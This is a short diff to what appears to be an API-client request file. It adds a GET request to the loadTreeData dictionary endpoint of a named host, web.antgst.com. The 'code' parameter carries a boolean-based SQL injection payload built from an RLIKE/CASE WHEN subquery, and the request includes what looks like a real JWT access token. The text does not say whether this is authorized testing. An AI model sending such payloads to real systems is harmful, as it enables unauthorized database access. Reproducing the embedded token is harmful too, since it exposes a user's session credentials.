@@ -5,3 +5,13 @@ User-Agent: Apifox/1.0.0 (https://apifox.com)
 Accept: */*
 Host: web.antgst.com
 Connection: keep-alive
+
+
+### 
+GET https://web.antgst.com/antgst/sys/dict/loadTreeData?pid=null&pidField=parent_id&tableName=sys_permission&text=name&code=id RLIKE (SELECT (CASE WHEN (7069=7069) THEN 0x6964 ELSE 0x28 END))&hasChildField=null&condition=null HTTP/1.1
+Host: web.antgst.com
+X-Access-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3MzQ1MDQyMDksInVzZXJuYW1lIjoiU1M2NzgifQ.2PhL_Sg-ciyfXsp1t_DxmPli8f3PmQkIVrGD04498lc
+User-Agent: Apifox/1.0.0 (https://apifox.com)
+Accept: */*
+Host: web.antgst.com
+Connection: keep-alive
